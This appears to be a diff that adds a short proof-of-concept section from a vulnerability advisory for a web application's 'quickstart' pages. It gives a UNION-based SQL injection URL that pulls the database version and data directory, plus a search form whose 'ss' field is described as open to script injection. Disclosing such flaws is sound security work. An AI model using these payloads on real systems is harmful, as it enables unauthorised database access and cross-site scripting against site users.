@@ -1,0 +1,16 @@
+﻿
+Proof of Concept:
+=================
+The vulnerabilities can be exploited by remote attackers. For example or reproduce ...
+
+1.1
+http://www.example.com/quickstart/profile/-1%20union%20all%20select%201,2,3,@@version,@@datadir,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
+
+1.2
+http://www.example.com/quickstart/search
+POST: Inject anything script related into ss
+<form method="post" action="http://www.example.com/quickstart/search">
+<input type="text" name="ss" class="src-box" value="" />
+<input type="submit" class="src-btn" value="Search" />
+</form>
+
